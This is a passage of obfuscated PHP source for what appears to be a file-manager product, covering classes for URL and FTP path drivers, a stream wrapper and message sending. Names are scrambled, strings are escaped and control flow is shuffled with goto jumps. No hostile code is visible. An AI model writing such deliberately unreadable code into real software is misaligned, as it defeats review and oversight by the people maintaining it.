parent::remove($c®™Ã¸Óß‹); } public function add($E·ÖÙÉ•¤, $eÉš”Õ¬®Á = "\x6c\x61\x62\x65\154\55\x67\x72\145\171\55\156\157\x72\155\x61\154") { $b¬ôê¬­ò =& $_SERVER[±á õÁ]; if ($this->findByName($E·ÖÙÉ•¤)) { return !1; } $AŒ¥İßì¡¤ = array($b¬ôê¬­ò[410] => $E·ÖÙÉ•¤, $b¬ôê¬­ò[460] => $eÉš”Õ¬®Á, $b¬ôê¬­ò[1625] => $this->getSort($b¬ôê¬­ò[261]) + 1); return parent::insert($AŒ¥İßì¡¤); } public function update($c¶Ë‰ÏíÖ, $B¿‚¹İŠŠ) { $b„Â‰®ğŒ =& $_SERVER[±á õÁ]; $B¿·…ÕÉ‹† = $this->listData($c¶Ë‰ÏíÖ); $D„Ïªö÷ = $this->findByName($B¿‚¹İŠŠ[$b„Â‰®ğŒ[38]]); if (!$B¿·…ÕÉ‹† || $D„Ïªö÷ && $D„Ïªö÷[$b„Â‰®ğŒ[391]] != $B¿·…ÕÉ‹†[$b„Â‰®ğŒ[391]]) { return !1; } return parent::update($c¶Ë‰ÏíÖ, $B¿‚¹İŠŠ); } public function moveTop($bÌ¼Ü¬ĞÃÈ) { $dÀ‡†ÏŞç« =& $_SERVER[±á õÁ]; $A¨ §ØôéÄ = parent::listData(); $DƒÁ‡Äó¨ = $this->getSort($dÀ‡†ÏŞç«[260]); foreach ($A¨ §ØôéÄ as &$aÊ™ØŞï‰) { if ($aÊ™ØŞï‰[$dÀ‡†ÏŞç«[391]] == $bÌ¼Ü¬ĞÃÈ) { $aÊ™ØŞï‰[$dÀ‡†ÏŞç«[1644]] = $DƒÁ‡Äó¨; continue; } $aÊ™ØŞï‰[$dÀ‡†ÏŞç«[1644]] += 1; } unset($aÊ™ØŞï‰); return parent::resetData($A¨ §ØôéÄ); } public function moveBottom($EÒ¯•ó„¤’) { $BêÂ¢Æôà¤ =& $_SERVER[±á õÁ]; $Aòôç†¨°Ì = $this->getSort($BêÂ¢Æôà¤[261]) + 1; return parent::update($EÒ¯•ó„¤’, array($BêÂ¢Æôà¤[1644] => $Aòôç†¨°Ì)); } public function resetSort($AÃ³ã‘’´Ô) { goto e¦­–Øå‡; e¦­–Øå‡: $a‰¬Åö‡Œà =& $_SERVER[±á õÁ]; $B…©¦” ï = array(); $AÃ³ã‘’´Ô = is_array($AÃ³ã‘’´Ô) ? $AÃ³ã‘’´Ô : array(); goto BÜ­ßÁ­ìŞ; BÜ­ßÁ­ìŞ: for ($fêùÅ¢’˜ê = 0; $fêùÅ¢’˜ê < count($AÃ³ã‘’´Ô); $fêùÅ¢’˜ê++) { $B…©¦” ï[$AÃ³ã‘’´Ô[$fêùÅ¢’˜ê] . $a‰¬Åö‡Œà[43]] = $fêùÅ¢’˜ê + 1; } $aÔè‰º£ÎÛ = parent::listData(); foreach ($aÔè‰º£ÎÛ as &$dİ´ÓÌ½–”) { $dÏÀÒÎ»ğì = $B…©¦” ï[$dİ´ÓÌ½–”[$a‰¬Åö‡Œà[391]]]; $dİ´ÓÌ½–”[$a‰¬Åö‡Œà[1644]] = $dÏÀÒÎ»ğì ? $dÏÀÒÎ»ğì : $dİ´ÓÌ½–”[$a‰¬Åö‡Œà[1644]]; } goto EÎƒ–âÍ; EÎƒ–âÍ: unset($dİ´ÓÌ½–”); return parent::resetData($aÔè‰º£ÎÛ); goto cêè×ä¼›Ÿ; cêè×ä¼›Ÿ: } private function getSort($Bö˜—‘Ò¡) { $B¬‚ÁÒĞ­ =& $_SERVER[±á õÁ]; $EŠ£«à©ìí = parent::listData(); $eÔÈÒÔ‰ÃÎ = array_to_keyvalue($EŠ£«à©ìí, $B¬‚ÁÒĞ­[43], $B¬‚ÁÒĞ­[1644]); if (!$eÔÈÒÔ‰ÃÎ) { $eÔÈÒÔ‰ÃÎ = array(0); } $f§°ó¯Ãƒº = $Bö˜—‘Ò¡ == $B¬‚ÁÒĞ­[261] ? max($eÔÈÒÔ‰ÃÎ) : min($eÔÈÒÔ‰ÃÎ); return intval($f§°ó¯Ãƒº); } } goto bšÓ†Ë‰ÌÚ; EéÛ™à´Ÿ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($cìŸª¹Ô£Ï = false) { } public function exist($EğÚ™½ÆØë) { $BÙ®ó‡‘Ö¤ = $this->info($EğÚ™½ÆØë); return $BÙ®ó‡‘Ö¤[$_SERVER[±á õÁ][201]]; } public function isFile($AÚ¾…ŠãÑ) { $d§Ûæ¦•Ü‡ = $this->info($AÚ¾…ŠãÑ); return $d§Ûæ¦•Ü‡[$_SERVER[±á õÁ][201]]; } public function isFolder($aÜ´ªíÒ„Í) { return !1; } public function size($bŸ¼Ğ–ï¥) { $CÕê¶„Š÷ì = $this->info($bŸ¼Ğ–ï¥); return $CÕê¶„Š÷ì[$_SERVER[±á õÁ][87]]; } public function info($C»ğ×Î¥·á) { return $this->infoParse($C»ğ×Î¥·á); } public function infoAuth($AÏì–ó­‹Œ) { return $this->infoParse($AÏì–ó­‹Œ); } public function infoWithChildren($e”ÙÓöà¼¸) { return $this->infoParse($e”ÙÓöà¼¸); } public function infoFull($fŸáæ½ä‰æ) { return $this->infoParse($fŸáæ½ä‰æ); } private function infoParse($fšï…÷Âš†) { $cªğŞ¯ËãŒ =& $_SERVER[±á õÁ]; $BŒ‡¨§“ÜÔ = $this->header($fšï…÷Âš†); if (!$BŒ‡¨§“ÜÔ || !$BŒ‡¨§“ÜÔ[$cªğŞ¯ËãŒ[714]]) { return !1; } $AĞ‡Ï™¬¡¾ = _get($BŒ‡¨§“ÜÔ, $cªğŞ¯ËãŒ[340], 0); $A½ÈİÛâŸ¼ = array($cªğŞ¯ËãŒ[38] => $BŒ‡¨§“ÜÔ[$cªğŞ¯ËãŒ[38]], $cªğŞ¯ËãŒ[85] => $fšï…÷Âš†, $cªğŞ¯ËãŒ[39] => $cªğŞ¯ËãŒ[181], $cªğŞ¯ËãŒ[87] => intval($AĞ‡Ï™¬¡¾), $cªğŞ¯ËãŒ[175] => get_path_ext($BŒ‡¨§“ÜÔ[$cªğŞ¯ËãŒ[38]]), $cªğŞ¯ËãŒ[1187] => $AĞ‡Ï™¬¡¾ > 0 && $BŒ‡¨§“ÜÔ[$cªğŞ¯ËãŒ[1309]], $cªğŞ¯ËãŒ[1188] => !1); return $A½ÈİÛâŸ¼; } private function header($E®—‹ŒŒˆ) { if (isset(self::$_cacheHeader[$E®—‹ŒŒˆ])) { return self::$_cacheHeader[$E®—‹ŒŒˆ]; } self::$_cacheHeader[$E®—‹ŒŒˆ] = url_header($E®—‹ŒŒˆ); return self::$_cacheHeader[$E®—‹ŒŒˆ]; } public function hashSimple($A£·ß£Àò£, $e÷…ô¶¥ê„ = false) { goto CàÎİÕñ”; CàÎİÕñ”: $côˆÆ‹äÓè =& $_SERVER[±á õÁ]; $FÑñ®çŒœ = $this->info($A£·ß£Àò£); if (!$FÑñ®çŒœ || !$FÑñ®çŒœ[$côˆÆ‹äÓè[201]]) { return !1; } goto f·íŠÁ‰ˆÆ; f·íŠÁ‰ˆÆ: $DÜ•˜½² = $FÑñ®çŒœ[$côˆÆ‹äÓè[87]]; $F´¹³ĞÏêä = 200; $fîÄ§„¢ = 50; goto eªïŞÜê˜ˆ; B–ÌÄ™Ü–: $aŠñàª¼ä .= $this->fileSubstr($A£·ß£Àò£, $DÜ•˜½² - $F´¹³ĞÏêä, $F´¹³ĞÏêä); return md5($aŠñàª¼ä) . $DÜ•˜½²; goto b”í¾Š‘É©; bõ¬¹Š»Şğ: $fî‹ÖÓÖñÃ = timeFloat(); $d˜‹Ì¨…ğ = 15; for ($Eãß·ëïÂù = 0; $Eãß·ëïÂù < $fîÄ§„¢; $Eãß·ëïÂù++) { if (timeFloat() - $fî‹ÖÓÖñÃ > $d˜‹Ì¨…ğ) { return !1; } $cõ¸£ÆÑ‰” = $this->fileSubstr($A£·ß£Àò£, $a¢×¦éÇ×‘ * $Eãß·ëïÂù, $F´¹³ĞÏêä); if (!$cõ¸£ÆÑ‰”) { return !1; } $aŠñàª¼ä .= $cõ¸£ÆÑ‰”; } goto B–ÌÄ™Ü–; eªïŞÜê˜ˆ: if ($DÜ•˜½² <= $F´¹³ĞÏêä * $fîÄ§„¢) { return md5($this->fileSubstr($A£·ß£Àò£, 0, $DÜ•˜½²)) . $DÜ•˜½²; } $a¢×¦éÇ×‘ = intval($DÜ•˜½² / $fîÄ§„¢); $aŠñàª¼ä = $côˆÆ‹äÓè[43]; goto bõ¬¹Š»Şğ; b”í¾Š‘É©: } public function getContent($D ë¤îé‰) { return $this->fileSubstr($D ë¤îé‰); } public function fileSubstr($DØÜ¾Œ§Ï, $E¯…„â®£ = 0, $F†‡–¬åòº = -1) { goto FëÄÀ¢«­—; CÄÎ§œ“ñ…: if ($F†‡–¬åòº === -1) { $F†‡–¬åòº = $e„š²Šì†º[$b„Ÿ¥íï Î[87]]; } if ($F†‡–¬åòº == 0) { return $b„Ÿ¥íï Î[43]; } $c¸›óùâé³ = array($b„Ÿ¥íï Î[1310] . $E¯…„â®£ . $b„Ÿ¥íï Î[740] . ($E¯…„â®£ + $F†‡–¬åòº - 1)); goto FÄáŸ¼‚¦; FëÄÀ¢«­—: $b„Ÿ¥íï Î =& $_SERVER[±á õÁ]; $e„š²Šì†º = $this->info($DØÜ¾Œ§Ï); if (!$e„š²Šì†º || !$e„š²Šì†º[$b„Ÿ¥íï Î[201]] && $e„š²Šì†º[$b„Ÿ¥íï Î[87]] > 1024 * 1024 * 10) { return !1; } goto CÄÎ§œ“ñ…; FÄáŸ¼‚¦: $DÚçÖ‚³– = url_request($DØÜ¾Œ§Ï, $b„Ÿ¥íï Î[234], !1, $c¸›óùâé³, !1, !1, 1); return $DÚçÖ‚³–[$b„Ÿ¥íï Î[1056]] ? $DÚçÖ‚³–[$b„Ÿ¥íï Î[1056]] : $b„Ÿ¥íï Î[43]; goto b¨îàØ¿Çª; b¨îàØ¿Çª: } public function download($Aö·Ô£÷ÄÔ, $f²­ÔÖè±) { Downloader::start($Aö·Ô£÷ÄÔ, $f²­ÔÖè±); return $f²­ÔÖè±; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($EóøèšÉ…¹, $aŠİ®²öãø = '') { goto cÆ®ªğë–; CŞ–½ò¿±™: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$EóøèšÉ…¹])) { self::$_chunkBuffer[$EóøèšÉ…¹] = array(); } goto FĞœÄãé; cÆ®ªğë–: $this->info = $this->info($EóøèšÉ…¹); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[±á õÁ][85]]; goto CŞ–½ò¿±™; FĞœÄãé: return $this->info ? !0 : !1; goto a¨Ô²ï¦²; a¨Ô²ï¦²: } function stream_read($C´áôˆ»Ë¨) { $FŠóù˜‡Áñ = $this->fileSubstr($this->pose, $C´áôˆ»Ë¨); $this->pose += strlen($FŠóù˜‡Áñ); return $FŠóù˜‡Áñ; } public function stream_tell() { return $this->pose; } public function stream_seek($aÃçÍ”÷éâ, $b›»Æ‡ÄÜù) { $fó¡˜öõ£Û =& $_SERVER[±á õÁ]; if ($b›»Æ‡ÄÜù == SEEK_SET) { $this->pose = $aÃçÍ”÷éâ; } else { if ($b›»Æ‡ÄÜù == SEEK_CUR) { $this->pose += $aÃçÍ”÷éâ; } else { if ($b›»Æ‡ÄÜù == SEEK_END) { $this->pose = $this->info[$fó¡˜öõ£Û[87]] + intval($aÃçÍ”÷éâ); } } } if ($aÃçÍ”÷éâ < 0) { $this->pose = $this->info[$fó¡˜öõ£Û[87]] + $aÃçÍ”÷éâ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[±á õÁ][87]]; } public function stream_close() { return !0; } public function url_stat($FÀç½•èÎ», $b†Û×Í½¥Ã) { $D¾•ˆœÇœÀ =& $_SERVER[±á õÁ]; $fè›§åâ¹é = $this->info($FÀç½•èÎ»); return array($D¾•ˆœÇœÀ[1311] => 0, $D¾•ˆœÇœÀ[1312] => 0, $D¾•ˆœÇœÀ[22] => 32768 + 511, $D¾•ˆœÇœÀ[1313] => 0, $D¾•ˆœÇœÀ[1314] => 0, $D¾•ˆœÇœÀ[1315] => 0, $D¾•ˆœÇœÀ[1316] => 0, $D¾•ˆœÇœÀ[87] => $fè›§åâ¹é[$D¾•ˆœÇœÀ[87]], $D¾•ˆœÇœÀ[1317] => $fè›§åâ¹é[$D¾•ˆœÇœÀ[1186]], $D¾•ˆœÇœÀ[1274] => $fè›§åâ¹é[$D¾•ˆœÇœÀ[117]], $D¾•ˆœÇœÀ[1273] => $fè›§åâ¹é[$D¾•ˆœÇœÀ[200]], $D¾•ˆœÇœÀ[1318] => 0, $D¾•ˆœÇœÀ[1319] => 0); } static $fileInfo = array(); public function info($Bƒ…«ÚÚ·°) { $E¨ë¼¸¦‘‰ = $_SERVER[±á õÁ][1320]; if (isset(self::$fileInfo[$Bƒ…«ÚÚ·°])) { return self::$fileInfo[$Bƒ…«ÚÚ·°]; } if (substr($Bƒ…«ÚÚ·°, 0, strlen($E¨ë¼¸¦‘‰)) != $E¨ë¼¸¦‘‰) { return !1; } self::$fileInfo[$Bƒ…«ÚÚ·°] = IO::info(substr($Bƒ…«ÚÚ·°, strlen($E¨ë¼¸¦‘‰))); return self::$fileInfo[$Bƒ…«ÚÚ·°]; } public static function read($Bè½™®ö‹­, $e ÍÖ¸‚£, $CéË½’¡) { goto AÛîÎùÛ•; AÛîÎùÛ•: $bº“Î‰‚­Ù =& $_SERVER[±á õÁ]; $aéÓ¨‹¡¡ = fopen($Bè½™®ö‹­, $bº“Î‰‚­Ù[1190]); if (!$aéÓ¨‹¡¡) { return $bº“Î‰‚­Ù[43]; } goto F»åˆ±‹¥Ï; b±ˆ›îğ: return $a„‹¯´Å‡¾; goto FÍî“·®œô; bóÑÊªÅ‡: $DÂ¿³âØ¡î = 0; while ($DÂ¿³âØ¡î < $CéË½’¡) { $C˜ƒ©”‚«© = min($eãŠˆåíµ, $CéË½’¡ - $DÂ¿³âØ¡î); $a„‹¯´Å‡¾ .= fread($aéÓ¨‹¡¡, $C˜ƒ©”‚«©); $DÂ¿³âØ¡î += $C˜ƒ©”‚«©; } fclose($aéÓ¨‹¡¡); goto b±ˆ›îğ; F»åˆ±‹¥Ï: $eãŠˆåíµ = 8192; fseek($aéÓ¨‹¡¡, $e ÍÖ¸‚£, SEEK_SET); $a„‹¯´Å‡¾ = $bº“Î‰‚­Ù[43]; goto bóÑÊªÅ‡; FÍî“·®œô: } public function fileSubstr($fƒ¶ºŞÉ¼è, $E¥ïğç’Û…) { goto B£µ¬±—‡; B£µ¬±—‡: $b·õ¥Ø›† =& $_SERVER[±á õÁ]; $B‘ÀÃ¦ëö¡ = $this->info[$b·õ¥Ø›†[87]]; $a£è„„³› = $fƒ¶ºŞÉ¼è; goto CÍ¨Ë¬ÇãÆ; Fùâ±«íñ‚: if ($fƒ¶ºŞÉ¼è + $E¥ïğç’Û… > $B‘ÀÃ¦ëö¡) { $E¥ïğç’Û… = $B‘ÀÃ¦ëö¡ - $fƒ¶ºŞÉ¼è; } if ($E¥ïğç’Û… <= 0) { return $b·õ¥Ø›†[43]; } if ($fƒ¶ºŞÉ¼è < 0 || $fƒ¶ºŞÉ¼è >= $B‘ÀÃ¦ëö¡ || $E¥ïğç’Û… <= 0 || $E¥ïğç’Û… > 1024 * 1024 * 5) { throw new Exception("\x69\157\x46\151\x6c\145\x52\x65\x61\144\40\145\x72\162\x6f\x72\41\x20\x73\x74\141\162\164\x3d{$fƒ¶ºŞÉ¼è}\73\x6c\x65\x6e\147\x74\x68\x3d{$E¥ïğç’Û…}\x3b\x20\163\x69\172\145\75{$B‘ÀÃ¦ëö¡}\x3b"); } goto BŸº“Ë¬Ÿ; a‡³ª„îÊ: ksort($aÖ”×Ã–î¬); $e²ÑóÍ…±‹ = substr($bÍ–ÏÇÂ­õ, $fƒ¶ºŞÉ¼è - $f”Ø²¦ˆâ…, $E¥ïğç’Û…); return $e²ÑóÍ…±‹; goto AğçÊ¹Ù†œ; CÍ¨Ë¬ÇãÆ: $d¸Ğ‹­ä­ô = $E¥ïğç’Û…; if ($fƒ¶ºŞÉ¼è < 0) { $fƒ¶ºŞÉ¼è = $B‘ÀÃ¦ëö¡ + $fƒ¶ºŞÉ¼è; } if ($E¥ïğç’Û… === !1) { $E¥ïğç’Û… = $B‘ÀÃ¦ëö¡ - $fƒ¶ºŞÉ¼è; } goto Fùâ±«íñ‚; Eõ÷”†‹»Ò: foreach ($aÖ”×Ã–î¬ as $A•à³À¡÷µ => $aØÜ¡ì¥²È) { $A•à³À¡÷µ = intval($A•à³À¡÷µ); $e§•­ÖŸ® = $A•à³À¡÷µ + strlen($aØÜ¡ì¥²È); if ($fƒ¶ºŞÉ¼è >= $e§•­ÖŸ®) { continue; } if ($fƒ¶ºŞÉ¼è >= $A•à³À¡÷µ && $fƒ¶ºŞÉ¼è + $E¥ïğç’Û… <= $e§•­ÖŸ®) { return substr($aØÜ¡ì¥²È, $fƒ¶ºŞÉ¼è - $A•à³À¡÷µ, $E¥ïğç’Û…); } break; } if (count($aÖ”×Ã–î¬) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($b·õ¥Ø›†[1321], $b·õ¥Ø›†[1322] . count($aÖ”×Ã–î¬) . "\x3b\x73\164\141\162\x74\x3d{$fƒ¶ºŞÉ¼è}\54\154\x65\156\147\x74\150\75{$E¥ïğç’Û…}\x3b\x70\157\163\145\x3a{$A•à³À¡÷µ}\176{$e§•­ÖŸ®}"); throw new Exception($b·õ¥Ø›†[1323]); } $f”Ø²¦ˆâ… = intval($fƒ¶ºŞÉ¼è / $Cì¥ïˆ êµ) * $Cì¥ïˆ êµ; goto c­¿ÒÅ¨æ‰; E”ÉœêÎ®†: $A•à³À¡÷µ = 0; $e§•­ÖŸ® = 0; $aØÜ¡ì¥²È = $b·õ¥Ø›†[43]; goto Eõ÷”†‹»Ò; c­¿ÒÅ¨æ‰: $eõ–¿”¬ù’ = ceil(($fƒ¶ºŞÉ¼è + $E¥ïğç’Û…) / $Cì¥ïˆ êµ) * $Cì¥ïˆ êµ - $f”Ø²¦ˆâ…; $bÍ–ÏÇÂ­õ = IO::fileSubstr($this->path, $f”Ø²¦ˆâ…, $eõ–¿”¬ù’); $aÖ”×Ã–î¬[$f”Ø²¦ˆâ… . $b·õ¥Ø›†[43]] = $bÍ–ÏÇÂ­õ; goto a‡³ª„îÊ; BŸº“Ë¬Ÿ: $Cì¥ïˆ êµ = 64 * 1024; $aÖ”×Ã–î¬ =& self::$_chunkBuffer[$this->path]; if (!$aÖ”×Ã–î¬) { $aÖ”×Ã–î¬ = array(); } goto E”ÉœêÎ®†; AğçÊ¹Ù†œ: } private function log($e²Æª‡±…ñ, $DÔ¶„¾Ö¤Ï) { $dá¹àô¹·µ =& $_SERVER[±á õÁ]; $b‚âÍ„àò» = timeFloat() - $this->timeStart; write_log(sprintf($dá¹àô¹·µ[1324], $e²Æª‡±…ñ, $this->info[$dá¹àô¹·µ[38]], $b‚âÍ„àò», $DÔ¶„¾Ö¤Ï), $dá¹àô¹·µ[1240]); } } class Message { function __construct() { } public function send($eíÂ¹Ñõß = '', $c®ßª½ÁĞÊ = array(), $d†¬Òí÷à = "\164\x65\170\164") { goto C†àÈ—š ; C†àÈ—š : $cêÑÌŠ…’ƒ =& $_SERVER[±á õÁ]; $C‰Ò÷ÓŸ»² = array($cêÑÌŠ…’ƒ[39] => $cêÑÌŠ…’ƒ[1325], $cêÑÌŠ…’ƒ[717] => $eíÂ¹Ñõß); if (in_array($d†¬Òí÷à, array($cêÑÌŠ…’ƒ[1325], $cêÑÌŠ…’ƒ[1326]))) { $C‰Ò÷ÓŸ»²[$cêÑÌŠ…’ƒ[39]] = $d†¬Òí÷à; } goto Bº­´’Ò†Ô; Bº­´’Ò†Ô: $c®ßª½ÁĞÊ = array($cêÑÌŠ…’ƒ[988] => isset($c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[988]]) ? $c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[988]] : $cêÑÌŠ…’ƒ[43], $cêÑÌŠ…’ƒ[559] => isset($c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[559]]) ? $c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[559]] : $cêÑÌŠ…’ƒ[43]); if (empty($eíÂ¹Ñõß) || empty($c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[988]]) && empty($c®ßª½ÁĞÊ[$cêÑÌŠ…’ƒ[559]])) { return !1; } $aÛàùÊÂÄÀ = array($cêÑÌŠ…’ƒ[1267] => $C‰Ò÷ÓŸ»², $cêÑÌŠ…’ƒ[1327] => $c®ßª½ÁĞÊ); goto Bà‡Ô–É’Ñ; Bà‡Ô–É’Ñ: Hook::trigger($cêÑÌŠ…’ƒ[1328], $aÛàùÊÂÄÀ); goto dóŠ„¥éÓ; dóŠ„¥éÓ: } } goto cÉÚ¥¹é; BİÓŸêƒ²ñ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($D¿‰©ê£‰) { parent::__construct(); if (count($D¿‰©ê£‰) > 0) { $this->_init($D¿‰©ê£‰); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($cĞ³–À‚‹ï) { $e¸®ØĞé„ì =& $_SERVER[±á õÁ]; global $config; $this->appCharset = $config[$e¸®ØĞé„ì[1173]]; $this->systemCharset = $config[$e¸®ØĞé„ì[1174]]; if (isset($cĞ³–À‚‹ï[$e¸®ØĞé„ì[1175]]) && $cĞ³–À‚‹ï[$e¸®ØĞé„ì[1175]]) { $this->systemCharset = $cĞ³–À‚‹ï[$e¸®ØĞé„ì[1175]]; } } public function iconvApp($FàÚÑ‚¶Ÿâ) { return $this->iconvTo($FàÚÑ‚¶Ÿâ, $this->systemCharset, $this->appCharset); } public function iconvSystem($bÅ¨›®¾ß‘) { return $this->iconvTo($bÅ¨›®¾ß‘, $this->appCharset, $this->systemCharset); } public function getPathOuter($fœ¬ÛëÔ) { goto BÅäİâ†‘; b¢·Õ‘‚øñ: $fœ¬ÛëÔ = KodIO::clear($fœ¬ÛëÔ); $fœ¬ÛëÔ = substr($fœ¬ÛëÔ, strlen($Aåóæ›“ä)); if (empty($this->pathDriver)) { return $fœ¬ÛëÔ; } goto f¨ãáè±±ø; BÅäİâ†‘: $B°Ì«š’Øç =& $_SERVER[±á õÁ]; $Aåóæ›“ä = $this->iconvApp($this->pathBase); $fœ¬ÛëÔ = $this->iconvApp($fœ¬ÛëÔ); goto dê‰ãŒ‰×ó; f¨ãáè±±ø: return $this->pathDriver . $B°Ì«š’Øç[8] . ltrim($fœ¬ÛëÔ, $B°Ì«š’Øç[8]); goto dšë›¬Áğ§; dê‰ãŒ‰×ó: if (substr($Aåóæ›“ä, 0, 2) == $B°Ì«š’Øç[1176]) { $Aåóæ›“ä = BASIC_PATH . substr($Aåóæ›“ä, 2); } if (substr($fœ¬ÛëÔ, 0, 2) == $B°Ì«š’Øç[1176]) { $fœ¬ÛëÔ = BASIC_PATH . substr($fœ¬ÛëÔ, 2); } $Aåóæ›“ä = KodIO::clear($Aåóæ›“ä); goto b¢·Õ‘‚øñ; dšë›¬Áğ§: } private function _init($fåºÌß‹Ë = array()) { $c»ï³¤ŸæŠ =& $_SERVER[±á õÁ]; if (!function_exists($c»ï³¤ŸæŠ[1177])) { throw new Exception(LNG($c»ï³¤ŸæŠ[1178])); } $this->config = $fåºÌß‹Ë; $this->charsetReset($fåºÌß‹Ë); foreach ($fåºÌß‹Ë as $aàËã‚ğÁ¼ => $f¯ø®’Ì­) { if (isset($this->{$aàËã‚ğÁ¼})) { $this->{$aàËã‚ğÁ¼} = $f¯ø®’Ì­; } } return $this->_login($fåºÌß‹Ë); } private function _login($bõˆ†Îä) { goto AŸ™Ì½è˜Š; AİÜ×äÇ’: if (isset($EïåæµÍ–ö[$aß”íäŸÀ])) { foreach ($EïåæµÍ–ö[$aß”íäŸÀ] as $E¾â£ô => $féïÛæÑÏÄ) { $this->{$E¾â£ô} = $féïÛæÑÏÄ; } return !0; } $D†ŠÂ›ÕÀ÷ = parse_url(trim($this->server, $aÉ˜İ­³×…[8])); $this->host = $D†ŠÂ›ÕÀ÷[$aÉ˜İ­³×…[183]]; goto FóÒ¼«Ëğâ; FóÒ¼«Ëğâ: $cŸ×¤åáƒğ = isset($D†ŠÂ›ÕÀ÷[$aÉ˜İ­³×…[182]]) && $D†ŠÂ›ÕÀ÷[$aÉ˜İ­³×…[182]] == $aÉ˜İ­³×…[1179] ? !0 : !1; $this->scheme = $cŸ×¤åáƒğ ? $aÉ˜İ­³×…[1180] : $aÉ˜İ­³×…[1181]; $this->port = isset($D†ŠÂ›ÕÀ÷[$aÉ˜İ­³×…[184]]) ? $D†ŠÂ›ÕÀ÷[$aÉ˜İ­³×…[184]] : 21; goto Fó°ô”¥ ; Fó°ô”¥ : $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Fìè»†Í¬ = @ftp_login($this->connect, $this->username, $this->userpass); goto dŠ©»’‡Â; dŠ©»’‡Â: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $D¨’˜®­äî = $this->pasv == $aÉ˜İ­³×…[93] ? !0 : !1; @ftp_pasv($this->connect, $D¨’˜®­äî); goto eŸø“®»à; AŸ™Ì½è˜Š: $aÉ˜İ­³×… =& $_SERVER[±á õÁ]; static $EïåæµÍ–ö = array(); $aß”íäŸÀ = md5(json_encode($bõˆ†Îä)); goto AİÜ×äÇ’; eŸø“®»à: $EïåæµÍ–ö[$aß”íäŸÀ] = array($aÉ˜İ­³×…[1182] => $this->connect, $aÉ˜İ­³×…[183] => $this->host, $aÉ˜İ­³×…[182] => $this->scheme, $aÉ˜İ­³×…[184] => $this->port); return $Fìè»†Í¬; goto B›Õê½œ±…; B›Õê½œ±…: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aÖÛìå³Ü, $Få—÷Îòæ = '', $dÎêãÈ©Óë = REPEAT_RENAME) { if ($this->setContent($aÖÛìå³Ü, $Få—÷Îòæ)) { return $this->getPathOuter($aÖÛìå³Ü); } return !1; } public function mkdir($eŒª˜éñ•ª, $cÏ™á¥ºØ¼ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $eŒª˜éñ•ª = $this->iconvSystem($eŒª˜éñ•ª); if ($this->isFolder($eŒª˜éñ•ª) || @ftp_mkdir($this->connect, $eŒª˜éñ•ª)) { return $this->getPathOuter($eŒª˜éñ•ª); } if (!$this->mkdir($this->pathFather($eŒª˜éñ•ª))) { return !1; } if ($eŒª˜éñ•ª = @ftp_mkdir($this->connect, $eŒª˜éñ•ª)) { return $this->getPathOuter($eŒª˜éñ•ª); } return !1; } public function copyFile($FÎËãŒğ‰, $FÛ¦­—ˆñ…) { goto AÄàê‚ğŠö; FÚ†îåÛÄ: $this->tempFileRemve($dÅ¶›Ü‘¢); return $bÂ®ØÄ÷Ğ†; goto e÷©Í¹¨´‹; AäÓØÃ™İõ: $C¹ÇØÁñÌÎ = $this->iconvApp($dÅ¶›Ü‘¢); $this->download($FÎËãŒğ‰, $C¹ÇØÁñÌÎ); $bÂ®ØÄ÷Ğ† = $this->upload($FÛ¦­—ˆñ…, $C¹ÇØÁñÌÎ); goto FÚ†îåÛÄ; AÄàê‚ğŠö: if (!$this->_isconn()) { return !1; } $fÆ®ÊÀ½Õ¨ = $this->pathThis($this->iconvSystem($FÎËãŒğ‰)); $dÅ¶›Ü‘¢ = $this->tempFile($fÆ®ÊÀ½Õ¨); goto AäÓØÃ™İõ; e÷©Í¹¨´‹: } public function moveFile($fõè°•ì‰, $aÏ‹ˆîí³®) { if (!$this->_isconn()) { return !1; } $fõè°•ì‰ = $this->iconvSystem($fõè°•ì‰); $aÏ‹ˆîí³® = $this->iconvSystem($aÏ‹ˆîí³®); $dŸÖİœ¡àÏ = @ftp_rename($this->connect, $fõè°•ì‰, $aÏ‹ˆîí³®); return $dŸÖİœ¡àÏ ? $this->getPathOuter($aÏ‹ˆîí³®) : !1; } public function delFile($D™»îÍî) { if (!$this->_isconn()) { return !1; } $D™»îÍî = $this->iconvSystem($D™»îÍî); return @ftp_delete($this->connect, $D™»îÍî); } public function delFolder($EôÂ¤ß¸Ğ¬) { goto B˜ì¼¬°Â; E¹ÄÉ¹½Ø: foreach ($c´¢’¹¤—– as $e±¶¼ŞÊÌ) { $e±¶¼ŞÊÌ = $this->iconvSystem($e±¶¼ŞÊÌ); $AÉÃ„ŠÙï¹ = @ftp_rmdir($this->connect, $e±¶¼ŞÊÌ); if (!$AÉÃ„ŠÙï¹) { return !1; } } $EôÂ¤ß¸Ğ¬ = $this->iconvSystem($EôÂ¤ß¸Ğ¬); return @ftp_rmdir($this->connect, $EôÂ¤ß¸Ğ¬); goto C­ºÑ‡¾’â; B˜ì¼¬°Â: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $c´¢’¹¤—– = $D«÷ÕêØ¼ = array(); goto C™Ú¨‡¾Î¸; C™Ú¨‡¾Î¸: $this->fileList($EôÂ¤ß¸Ğ¬, $c´¢’¹¤—–, $D«÷ÕêØ¼, !0); $this->listItemCache = !0; foreach ($D«÷ÕêØ¼ as $c‹ìùôÍÚÍ) { 